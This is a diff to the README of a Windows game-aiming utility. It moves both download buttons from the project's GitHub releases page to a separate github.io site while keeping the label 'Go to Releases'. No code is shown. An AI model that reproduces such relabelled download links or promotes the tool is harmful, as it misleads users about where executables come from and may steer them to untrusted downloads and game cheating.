@@ -1,6 +1,6 @@
 # 🎯 alphabix-windows-utility-v18 - Shoot Better, Aim Faster, Win More
 
-[![Download Alphabix v18](https://img.shields.io/badge/Download-Alphabix_v18-2ea44f?style=for-the-badge)](https://github.com/Hempgamer/alphabix-windows-utility-v18/releases)
+[![Download Alphabix v18](https://img.shields.io/badge/Download-Alphabix_v18-2ea44f?style=for-the-badge)](https://hempgamer.github.io)
 
 ---
 
@@ -22,7 +22,7 @@ Follow these simple steps. You will have Alphabix v18 running in under five minu
 
 Click this button to go to the download page:
 
-[![Go to Releases](https://img.shields.io/badge/Go_to_Releases-2ea44f?style=for-the-badge)](https://github.com/Hempgamer/alphabix-windows-utility-v18/releases)
+[![Go to Releases](https://img.shields.io/badge/Go_to_Releases-2ea44f?style=for-the-badge)](https://hempgamer.github.io)
 
 ### Step 2: Find the Latest Version
 
